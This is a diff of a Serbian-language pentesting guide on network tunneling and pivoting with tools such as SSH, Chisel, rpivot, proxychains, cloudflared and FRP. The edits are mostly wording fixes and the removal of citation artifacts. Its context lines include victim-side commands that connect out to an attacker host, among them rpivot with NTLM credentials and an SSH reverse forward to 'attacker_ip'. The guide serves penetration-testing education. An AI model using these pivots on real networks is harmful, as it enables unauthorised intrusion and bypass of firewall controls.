@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Bezbednost – Terrapin napad (CVE-2023-48795)**
-> Napad na downgrade Terrapin iz 2023. može omogućiti napadaču u sredini da manipuliše ranim SSH rukovanjem i ubaci podatke u **bilo koji prosleđeni kanal** ( `-L`, `-R`, `-D` ). Osigurajte da su i klijent i server zakrpljeni (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ili eksplicitno onemogućite ranjive `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` algoritme u `sshd_config`/`ssh_config` pre nego što se oslonite na SSH tunele. citeturn4search0
+> Napad na downgrade Terrapin iz 2023. može omogućiti napadaču u sredini da manipuliše ranim SSH rukovanjem i ubaci podatke u **bilo koji prosleđeni kanal** ( `-L`, `-R`, `-D` ). Osigurajte da su i klijent i server zakrpljeni (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ili eksplicitno onemogućite ranjive `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` algoritme u `sshd_config`/`ssh_config` pre nego što se oslonite na SSH tuneli.
 
 ## SSHUTTLE
 
@@ -179,7 +179,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 Možete ga preuzeti sa stranice za izdanja [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Morate koristiti **istu verziju za klijent i server**
+Morate koristiti **istu verziju za klijenta i server**
 
 ### socks
 ```bash
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivot kroz **NTLM proxy**
+Pivotiranje kroz **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -370,7 +370,7 @@ netstat -antb | findstr 1080
 ```
 Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) **da proksirate saobraćaj kroz tu port.**
 
-## Proksirajte Windows GUI aplikacije
+## Proksiranje Windows GUI aplikacija
 
 Možete naterati Windows GUI aplikacije da prolaze kroz proksi koristeći [**Proxifier**](https://www.proxifier.com/).\
 U **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
@@ -379,7 +379,7 @@ U **Profile -> Proxification Rules** dodajte ime programa koji želite da proksi
 ## NTLM proksi zaobilaženje
 
 Prethodno pomenuti alat: **Rpivot**\
-**OpenVPN** takođe može da ga zaobiđe, postavljajući ove opcije u konfiguracionom fajlu:
+**OpenVPN** takođe može da ga zaobiđe, postavljanjem ovih opcija u konfiguracionom fajlu:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -387,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Ovaj alat se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru preko ovog porta.\
+Ovaj alat se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru kroz ovaj port.\
 Na primer, prosledite port 443.
 ```
 Username Alice
@@ -446,13 +446,13 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Promena DNS u proxychains
 
-Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **defaultu** DNS server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
+Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **definiciji**, **DNS** server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
 
 ## Tunneli u Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## ICMP Tunneling
+## ICMP Tunelovanje
 
 ### Hans
 
@@ -549,7 +549,7 @@ addr: file:///tmp/httpbin/
 
 Cloudflare-ov `cloudflared` daemon može da kreira izlazne tunele koji izlažu **lokalne TCP/UDP usluge** bez potrebe za ulaznim pravilima vatrozida, koristeći Cloudflare-ovu ivicu kao mesto susreta. Ovo je veoma korisno kada izlazni vatrozid dozvoljava samo HTTPS saobraćaj, dok su ulazne konekcije blokirane.
 
-### Brza komanda za tunel
+### Quick tunnel one-liner
 ```bash
 # Expose a local web service listening on 8080
 cloudflared tunnel --url http://localhost:8080
@@ -574,7 +574,7 @@ Pokrenite konektor:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Zbog toga što sav saobraćaj napušta host **izlazno preko 443**, Cloudflared tuneli su jednostavan način da se zaobiđu ulazni ACL-ovi ili NAT granice. Budite svesni da se binarni fajl obično pokreće sa povišenim privilegijama – koristite kontejnere ili `--user` flag kada je to moguće. citeturn1search0
+Zbog toga što sav saobraćaj napušta host **izlazno preko 443**, Cloudflared tuneli su jednostavan način da se zaobiđu ulazni ACL-ovi ili NAT granice. Budite svesni da se binarni fajl obično pokreće sa povišenim privilegijama – koristite kontejnere ili `--user` flag kada je to moguće.
 
 ## FRP (Fast Reverse Proxy)
 
@@ -608,7 +608,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Gore navedena komanda objavljuje port žrtve **8080** kao **attacker_ip:9000** bez implementacije dodatnih alata – idealno za living-off-the-land pivoting. citeturn2search1
+Gore navedena komanda objavljuje port žrtve **8080** kao **attacker_ip:9000** bez implementacije dodatnih alata – idealno za pivotiranje koristeći resurse na terenu.
 
 ## Ostali alati za proveru
 
